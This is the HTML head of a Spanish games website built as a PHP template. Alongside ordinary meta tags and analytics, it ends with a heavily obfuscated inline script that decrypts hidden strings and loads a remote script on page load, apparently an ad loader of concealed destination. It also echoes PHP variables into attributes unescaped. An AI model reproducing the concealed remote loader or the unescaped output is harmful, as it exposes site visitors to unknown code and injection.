<!DOCTYPE html>
<html lang="es">
    <head>
     <script defer src="https://use.fontawesome.com/releases/v5.8.2/js/all.js" integrity="sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH" crossorigin="anonymous"></script> 
     <?php 
     echo '<title>' . $title . '</title>
     <meta name="description" content="' . $description . '"/>
     <meta property="og:description" content="' . $description . '"/>
     <meta name="title" content="' . $title . '"/>
     <meta name="keywords" content="' . $key . '">';
     ?>
     <!-- Metadata -->    
		<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
		<meta charset="UTF-8"/>
        <meta name="viewport" content="initial-scale=1, maximum-scale=3, minimum-scale=1, user-scalable=no">
        <link rel="canonical" href="<?php echo $fila['link'] ?>"/>
        <link rel="apple-touch-icon" href="https://lomuchachogames.com/fotos/LOMUCHACHOgames.png">
        <meta property="og:site_name" content="LOMUCHACHOgames"/>
		<meta property="og:locale" content="es_ES"/>
		<meta property="og:title" content="<?php echo $title ?>"/>
		<meta  name="og:url" content="<?php echo $fila['link'] ?>" property="og:url"/>
		<meta property="og:type" content="website"/>
		<meta property="og:image" content="https://lomuchachogames.com/'.<?php echo $fila['texto'] ?>.'" />
		<meta name="ROBOTS" content="all">
        <link rel="icon" type="image/png" href="https://lomuchachogames.com/fotos/LOMUCHACHOgames.png"/>
       <!--  Todos los CSS -->
       <link rel="stylesheet" href="https://lomuchachogames.com/css/menu.css" type="text/css">
       <link defer rel="stylesheet" href="https://lomuchachogames.com/css/general.css?v=1.1" type="text/css">
         
 <!-- Global site tag (gtag.js) - Google Analytics -->
<script defer src="https://www.googletagmanager.com/gtag/js?id=UA-118219919-1"></script>
<script defer>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-118219919-1');
</script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
(function(){var bd2f555c9b555069708c34bc9f12b7f0="EU6Vii1Owks8X4GIJi58ryrPzIvOK7HSVnchzJuDymq9HMSzFclU3nTH_VXoT8TYR6s52GYgu16I9efPzesK";var a=['d8KjUMKFPMKs','w4kkAMKzw7giwr5xw6jCvsKINCPDssKM','wofChcOiwrPCqsK5wowpwr/Cu8OVSg==','wq7Dl8OSRHhvw5IP','ZlPDpWvCpcKNTMKDw5MCMURefMKBFHxWbAw=','DDzCoHDCjVvDr8OOwqzCjA==','OMOcHcOhw6HDjRo=','wpDCmMO9wq3CtsKFwooMwrnCq8Oe','SMOkwpRuXSzCgT9dR8Oowqxww4LDk8OdD8OVwp/DjTTCscKqw7xwSFjChGnCsXZ2wpVic8Onw5nCoMObVMKPEcKMUH7DoAUFc8KAwq3CvxvClQ==','QDrCtsK7woY=','TcKjdcOaLxdBwqPCqCDCusODwrB4','RcKjw7TCnQ==','QcOnYMOawqvDmVcnw4pXwpfDknTCgsOVBGdKUMKkOn7DrsKKw45jwpxOU1pdUQrDhWjDjcKAwq5pQg==','wpDCryg4wqNEwovDhg==','wqzCmsO9wq4=','ccOowrPCpy3Cgw==','w7TClcKTw53DisOTRMOKZQ==','esOFw4lER3wn','NsOjQh1kGMOIw7cdc8KzMA==','wo7DmXcNw7LDucO8wpEmCcOSazg=','ccOOw4BXTFEwSMOSw7E0wq0=','DsK/woNBWUE=','worCmhXCr8KNwrABOQ==','L1wh','f8OzwrjChDDCgsKbw53Ds8OcZ8OQw4k=','wpVswqpqw6TDkw==','wqUvwrE='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x80));var b=function(c,d){c=c-0x0;var e=a[c];if(b['znEWzP']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['jitNou']=g;b['KhRfKv']={};b['znEWzP']=!![];}var f=b['KhRfKv'][c];if(f===undefined){if(b['UYFKEw']===undefined){b['UYFKEw']=!![];}e=b['jitNou'](e,d);b['KhRfKv'][c]=e;}else{e=f;}return e;};var v=window;v[b('0x15','in50')]=[[b('0x7','uozh'),0x4905f7],[b('0x16','n%T2'),0x0],[b('0x11','nE9C'),b('0x3','E9RT')],[b('0x0','pu]1'),0x0],[b('0xd','H31N'),![]],[b('0x1a','qnVo'),0x0],[b('0x9','in50'),!0x0]];var f=[b('0x13','s&fV'),b('0xf','Mt5n')],x=0x0,l,g=function(){if(!f[x])return;l=v[b('0xa','l*D9')][b('0x4','n%T2')](b('0x5','TT2W'));l[b('0x12','rLo2')]=b('0x8','HG9e');l[b('0x10','iTOu')]=!0x0;var c=v[b('0x14','OBeJ')][b('0xb','DsNu')](b('0x1','8ci7'))[0x0];l[b('0x6','Ra!8')]=b('0x2','j$uA')+f[x];l[b('0xe','in50')]=b('0x17','U7%m');l[b('0x18','pu]1')]=function(){x++;g();};c[b('0xc','56#^')][b('0x19','q9MU')](l,c);};g();})();
/*]]>/* */
</script>
</head>